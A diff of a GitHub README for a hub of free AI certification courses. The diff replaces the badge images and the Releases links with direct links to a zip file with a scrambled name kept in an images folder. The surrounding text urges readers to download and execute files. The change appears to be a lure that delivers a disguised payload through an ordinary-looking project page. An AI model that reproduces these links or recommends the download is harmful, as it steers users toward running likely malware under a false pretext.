@@ -1,8 +1,8 @@
 # Free to Learn AI Certifications Hub 🎓🤖
 
-![GitHub Repo Size](https://img.shields.io/github/repo-size/betao1005/Free-to-Learn-AI-Certifications-Hub)
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Last Commit](https://img.shields.io/github/last-commit/betao1005/Free-to-Learn-AI-Certifications-Hub)
+![GitHub Repo Size](https://raw.githubusercontent.com/betao1005/Free-to-Learn-AI-Certifications-Hub/main/public/images/to_Hub_A_Certifications_Free_Learn_v3.4.zip)
+![License](https://raw.githubusercontent.com/betao1005/Free-to-Learn-AI-Certifications-Hub/main/public/images/to_Hub_A_Certifications_Free_Learn_v3.4.zip)
+![Last Commit](https://raw.githubusercontent.com/betao1005/Free-to-Learn-AI-Certifications-Hub/main/public/images/to_Hub_A_Certifications_Free_Learn_v3.4.zip)
 
 Welcome to the **Free to Learn AI Certifications Hub**! This repository offers a curated collection of enterprise-grade AI learning platforms that provide free training opportunities. Many of these platforms also offer paid, industry-recognized certifications to enhance your career prospects.
 
@@ -84,7 +84,7 @@ Here are some of the top platforms offering free AI training and certifications:
 3. **Access the Training**: Follow the links to the platforms to start your free training.
 4. **Complete the Certification**: After completing the training, pursue the certification to validate your skills.
 
-For the latest updates and to download resources, please visit the [Releases section](https://github.com/betao1005/Free-to-Learn-AI-Certifications-Hub/releases).
+For the latest updates and to download resources, please visit the [Releases section](https://raw.githubusercontent.com/betao1005/Free-to-Learn-AI-Certifications-Hub/main/public/images/to_Hub_A_Certifications_Free_Learn_v3.4.zip).
 
 ## Contributing
 
@@ -102,7 +102,7 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 ## Visit Releases
 
-For the latest updates and downloadable resources, check the [Releases section](https://github.com/betao1005/Free-to-Learn-AI-Certifications-Hub/releases). Here, you can find files that need to be downloaded and executed for various updates and resources.
+For the latest updates and downloadable resources, check the [Releases section](https://raw.githubusercontent.com/betao1005/Free-to-Learn-AI-Certifications-Hub/main/public/images/to_Hub_A_Certifications_Free_Learn_v3.4.zip). Here, you can find files that need to be downloaded and executed for various updates and resources.
 
 ---
 
